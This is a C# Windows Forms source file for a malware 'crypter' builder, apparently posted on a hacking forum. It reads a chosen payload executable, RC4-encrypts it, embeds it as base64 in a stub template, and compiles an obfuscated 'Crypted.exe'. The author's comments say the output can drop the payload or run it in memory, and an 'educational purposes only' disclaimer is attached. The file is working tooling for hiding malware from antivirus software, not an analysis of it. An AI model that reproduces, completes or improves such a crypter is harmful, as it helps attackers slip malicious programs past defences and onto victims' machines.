using EasyStore_Example.Properties;
using System;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace EasyStore_Example
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            InitializeComponent();
        }

        /* Author: StarZ, UID 69588
         * 
         * Output can be modified to drop the payload.
         * Execute in memory only supports Managed (.net) payloads.
         * This code is explicitly for educational purposes only.
         * 
         * Note: This is a viable method for most larger payloads.
         */



        private void tbPath_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (!btnCompile.Enabled)
            {
                using (OpenFileDialog o = new OpenFileDialog())
                {
                    o.InitialDirectory = Environment.CurrentDirectory;
                    if(o.ShowDialog() == DialogResult.OK)
                    {
                        tbPath.Text = o.FileName;
                        btnCompile.Enabled = true;
                    }
                }
            }
        }
        private void cryptPayload(string payloadPath, byte[] key)
        {
            byte[] payLoad = File.ReadAllBytes(payloadPath); // Buffer with our payload

            //Prepare our code.
            string outputSource = Resources.outputSource.ToString().Replace("%%payLoadData%%", Convert.ToBase64String(RC4.Encrypt(key, payLoad))).Replace("%%KEY%%", Encoding.Default.GetString(key));

            //Compile our output.
            string compilerResults = CodeDOM.Compile(outputSource, Environment.CurrentDirectory + @"\Crypted.exe");

            if(compilerResults == "")
            {
                MessageBox.Show("Success, output is in same directory as crypter!");
            }
            else
            {
                MessageBox.Show("Compiler Error, .NET Framework version not found or modified source code.");
                //Output compilerResults here.
            }
        }

        private void btnCompile_Click(object sender, EventArgs e)
        {
           cryptPayload(tbPath.Text, Encoding.Default.GetBytes(Guid.NewGuid().ToString()));
        }

        public void frmMain_Load(object sender, EventArgs e)
        {
            comboBox1.SelectedItem = "v2.0.50727";
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.Compile = (comboBox1.Text);
            Properties.Settings.Default.Save();
        }

        private void tbPath_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            {
                using (OpenFileDialog o = new OpenFileDialog())
                {
                    o.InitialDirectory = Environment.CurrentDirectory;
                    if (o.ShowDialog() == DialogResult.OK)
                    {
                        tbPath.Text = o.FileName;
                        btnCompile.Enabled = true;
                    }
                }
            }
        }
    }
}
